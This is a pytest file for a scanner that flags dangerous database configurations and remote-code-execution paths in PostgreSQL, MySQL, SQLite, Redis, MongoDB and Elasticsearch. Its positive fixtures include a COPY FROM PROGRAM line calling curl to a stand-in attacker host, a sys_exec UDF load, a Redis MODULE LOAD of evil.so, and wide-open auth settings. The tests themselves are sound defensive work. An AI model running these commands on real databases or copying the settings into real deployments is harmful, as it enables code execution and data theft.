"""Tests for scripts/lib/db_extensions_patterns.py.

Pattern-coverage tests for the Wave-22 distillation round 8 angle D
catalogue (16 database-extension / DBA-RCE rules covering PostgreSQL,
MySQL/MariaDB, SQLite, Redis, MongoDB, and Elasticsearch server-side
configuration depth). Each rule has exactly one positive test
exercising a realistic canary AND one negative test exercising a
similar-looking-but-safe shape — 32 tests total.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts" / "lib"))
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tests"))
from _fake_secrets import b62, dsn  # noqa: E402,I001

import db_extensions_patterns as dep  # type: ignore[import-not-found]  # noqa: E402


def _hits(rule_id: str, src: str, *, path: str = "") -> list:
    """Return only findings whose rule_id matches the requested rule."""
    return [f for f in dep.scan_text(src, path=path) if f.rule_id == rule_id]


# ---------- Rule 1: pg-superuser-app-role --------------------------------


def test_pg_superuser_app_role_positive() -> None:
    """DSN with user=postgres (superuser-equivalent) → CRITICAL fire."""
    # Rule matches on literal superuser name in DSN; fragment scheme so no
    # contiguous credential-bearing URL literal exists at rest.
    _pg = "postgres" + "://"
    _pw = b62("dep-pg-super-pos:pw", 16)
    src = f'DATABASE_URL = "{_pg}postgres:{_pw}@db.internal:5432/app"\n'
    assert _hits("pg-superuser-app-role", src)


def test_pg_superuser_app_role_negative() -> None:
    """DSN with least-priv app_user role → no fire."""
    src = f'DATABASE_URL = "{dsn("postgres", "dep-pg-super-neg", host="db.internal", port=5432, db="app")}"\n'
    assert not _hits("pg-superuser-app-role", src)


# ---------- Rule 2: pg-role-bypassrls ------------------------------------


def test_pg_role_bypassrls_positive() -> None:
    """ALTER USER ... NOSUPERUSER without NOBYPASSRLS → HIGH fire."""
    src = "ALTER USER app_role NOSUPERUSER NOCREATEDB NOCREATEROLE;\n"
    assert _hits("pg-role-bypassrls", src)


def test_pg_role_bypassrls_negative() -> None:
    """ALTER USER with NOBYPASSRLS on same line → suppressed."""
    src = "ALTER USER app_role NOSUPERUSER NOCREATEDB NOCREATEROLE NOBYPASSRLS;\n"
    assert not _hits("pg-role-bypassrls", src)


# ---------- Rule 3: pg-copy-from-program ---------------------------------


def test_pg_copy_from_program_positive() -> None:
    """COPY ... FROM PROGRAM '/usr/bin/curl ...' → CRITICAL fire."""
    src = "COPY users(name, email) FROM PROGRAM '/usr/bin/curl http://attacker/dump.csv';\n"
    assert _hits("pg-copy-from-program", src)


def test_pg_copy_from_program_negative() -> None:
    """COPY ... FROM '/path/to/file.csv' (no PROGRAM keyword) → no fire."""
    src = "COPY users(name, email) FROM '/var/imports/users.csv' WITH CSV HEADER;\n"
    assert not _hits("pg-copy-from-program", src)


# ---------- Rule 4: pg-untrusted-pl-ext ----------------------------------


def test_pg_untrusted_pl_ext_positive() -> None:
    """CREATE EXTENSION plpython3u (untrusted variant) → CRITICAL fire."""
    src = "CREATE EXTENSION IF NOT EXISTS plpython3u;\n"
    assert _hits("pg-untrusted-pl-ext", src)


def test_pg_untrusted_pl_ext_negative() -> None:
    """CREATE EXTENSION plperl (trusted variant, no 'u' suffix) → no fire."""
    src = "CREATE EXTENSION IF NOT EXISTS plperl;\n"
    assert not _hits("pg-untrusted-pl-ext", src)


# ---------- Rule 5: pg-server-files-role ---------------------------------


def test_pg_server_files_role_positive() -> None:
    """GRANT pg_read_server_files TO etl_user → HIGH fire."""
    src = "GRANT pg_read_server_files TO etl_user;\n"
    assert _hits("pg-server-files-role", src)


def test_pg_server_files_role_negative() -> None:
    """GRANT SELECT on an app-owned table (no server-files role) → no fire."""
    src = "GRANT SELECT ON server_files_audit TO etl_user;\n"
    assert not _hits("pg-server-files-role", src)


# ---------- Rule 6: pg-dynlib-path-tampered ------------------------------


def test_pg_dynlib_path_tampered_positive() -> None:
    """dynamic_library_path appending /tmp dir → CRITICAL fire."""
    src = "dynamic_library_path = '$libdir:/tmp/extensions'\n"
    assert _hits("pg-dynlib-path-tampered", src)


def test_pg_dynlib_path_tampered_negative() -> None:
    """dynamic_library_path = '$libdir' (default safe value) → no fire."""
    src = "dynamic_library_path = '$libdir'\n"
    assert not _hits("pg-dynlib-path-tampered", src)


# ---------- Rule 7: pg-hba-trust-md5 -------------------------------------


def test_pg_hba_trust_md5_positive() -> None:
    """pg_hba.conf line ending in trust → HIGH fire."""
    src = "host all all 0.0.0.0/0 trust\n"
    assert _hits("pg-hba-trust-md5", src)


def test_pg_hba_trust_md5_negative() -> None:
    """pg_hba.conf line with scram-sha-256 (strong auth) → no fire."""
    src = "hostssl all all 0.0.0.0/0 scram-sha-256\n"
    assert not _hits("pg-hba-trust-md5", src)


# ---------- Rule 8: pg-dsn-sslmode-weak ----------------------------------


def test_pg_dsn_sslmode_weak_positive() -> None:
    """DSN with sslmode=disable → HIGH fire."""
    _base = dsn("postgresql", "dep-pg-ssl-disable", host="db.internal", port=None, db="app")
    src = f'DATABASE_URL = "{_base}?sslmode=disable"\n'
    assert _hits("pg-dsn-sslmode-weak", src)


def test_pg_dsn_sslmode_weak_negative() -> None:
    """DSN with sslmode=verify-full → no fire."""
    _base = dsn("postgresql", "dep-pg-ssl-verify", host="db.internal", port=None, db="app")
    src = f'DATABASE_URL = "{_base}?sslmode=verify-full"\n'
    assert not _hits("pg-dsn-sslmode-weak", src)


# ---------- Rule 9: sqlite-load-extension --------------------------------


def test_sqlite_load_extension_positive() -> None:
    """conn.enable_load_extension(True) on a SQLite connection → CRITICAL fire."""
    src = (
        "import sqlite3\n"
        "conn = sqlite3.connect('app.db')\n"
        "conn.enable_load_extension(True)\n"
        "conn.load_extension('/usr/lib/mod_spatialite')\n"
    )
    assert _hits("sqlite-load-extension", src)


def test_sqlite_load_extension_negative() -> None:
    """Foreign-key pragma toggle (similar API surface) → no fire."""
    src = (
        "import sqlite3\n"
        "conn = sqlite3.connect('app.db')\n"
        "conn.execute('PRAGMA foreign_keys = ON')\n"
    )
    assert not _hits("sqlite-load-extension", src)


# ---------- Rule 10: mysql-udf-soname ------------------------------------


def test_mysql_udf_soname_positive() -> None:
    """CREATE FUNCTION ... SONAME 'lib_mysqludf_sys.so' → CRITICAL fire."""
    src = "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';\n"
    assert _hits("mysql-udf-soname", src)


def test_mysql_udf_soname_negative() -> None:
    """CREATE FUNCTION ... BEGIN ... END (pure stored function) → no fire."""
    src = (
        "CREATE FUNCTION my_sum(a INT, b INT) RETURNS INTEGER\n"
        "DETERMINISTIC\n"
        "BEGIN\n"
        "  RETURN a + b;\n"
        "END;\n"
    )
    assert not _hits("mysql-udf-soname", src)


# ---------- Rule 11: mysql-secure-file-priv-empty ------------------------


def test_mysql_secure_file_priv_empty_positive() -> None:
    """my.cnf line `secure_file_priv = ''` (empty, wide-open) → HIGH fire."""
    src = (
        "[mysqld]\n"
        "secure_file_priv = ''\n"
        "max_connections = 200\n"
    )
    assert _hits("mysql-secure-file-priv-empty", src)


def test_mysql_secure_file_priv_empty_negative() -> None:
    """my.cnf with restricted secure_file_priv path → no fire."""
    src = (
        "[mysqld]\n"
        "secure_file_priv = /var/imports\n"
        "max_connections = 200\n"
    )
    assert not _hits("mysql-secure-file-priv-empty", src)


# ---------- Rule 12: mysql-client-local-infile ---------------------------


def test_mysql_client_local_infile_positive() -> None:
    """pymysql.connect(local_infile=True) → HIGH fire."""
    src = (
        "import pymysql\n"
        "conn = pymysql.connect(host='db.internal', user='app', "
        "password=PW, db='app', local_infile=True)\n"
    )
    assert _hits("mysql-client-local-infile", src)


def test_mysql_client_local_infile_negative() -> None:
    """pymysql.connect(local_infile=False) (explicit safe value) → no fire."""
    src = (
        "import pymysql\n"
        "conn = pymysql.connect(host='db.internal', user='app', "
        "password=PW, db='app', local_infile=False)\n"
    )
    assert not _hits("mysql-client-local-infile", src)


# ---------- Rule 13: redis-no-auth-modload -------------------------------


def test_redis_no_auth_modload_positive() -> None:
    """MODULE LOAD command in a Redis CLI script → CRITICAL fire."""
    src = 'redis_cli.execute_command("MODULE LOAD /tmp/evil.so")\n'
    assert _hits("redis-no-auth-modload", src)


def test_redis_no_auth_modload_negative() -> None:
    """redis.Redis(host=..., password=...) with password on same line → suppressed."""
    src = (
        "import os, redis\n"
        "r = redis.Redis(host='redis.internal', port=6379, password=os.environ['REDIS_PASS'])\n"
    )
    assert not _hits("redis-no-auth-modload", src)


# ---------- Rule 14: mysql-skip-grant-tables -----------------------------


def test_mysql_skip_grant_tables_positive() -> None:
    """Docker compose / k8s command with --skip-grant-tables → CRITICAL fire."""
    src = (
        "services:\n"
        "  mysql:\n"
        "    image: mysql:8.0\n"
        "    command: mysqld --skip-grant-tables --bind-address=0.0.0.0\n"
    )
    assert _hits("mysql-skip-grant-tables", src)


def test_mysql_skip_grant_tables_negative() -> None:
    """mysqld command without --skip-grant-tables flag → no fire."""
    src = (
        "services:\n"
        "  mysql:\n"
        "    image: mysql:8.0\n"
        "    command: mysqld --bind-address=127.0.0.1\n"
    )
    assert not _hits("mysql-skip-grant-tables", src)


# ---------- Rule 15: mongo-where-eval ------------------------------------


def test_mongo_where_eval_positive() -> None:
    """db.find({'$where': f'this.role == \"{role}\"'}) (interpolation) → HIGH fire."""
    src = (
        "role = request.args['role']\n"
        "users = db.users.find({'$where': f\"this.role == '{role}'\"})\n"
    )
    assert _hits("mongo-where-eval", src)


def test_mongo_where_eval_negative() -> None:
    """db.find({'role': role}) operator-shape query → no fire."""
    src = (
        "role = request.args['role']\n"
        "users = db.users.find({'role': role, 'active': True})\n"
    )
    assert not _hits("mongo-where-eval", src)


# ---------- Rule 16: es-painless-inline-open -----------------------------


def test_es_painless_inline_open_positive() -> None:
    """elasticsearch.yml `script.allowed_types: inline` → HIGH fire."""
    src = (
        "cluster.name: prod\n"
        "script.allowed_types: inline\n"
        "node.name: node-1\n"
    )
    assert _hits("es-painless-inline-open", src)


def test_es_painless_inline_open_negative() -> None:
    """elasticsearch.yml `script.allowed_types: stored` (safe value) → no fire."""
    src = (
        "cluster.name: prod\n"
        "script.allowed_types: stored\n"
        "node.name: node-1\n"
    )
    assert not _hits("es-painless-inline-open", src)
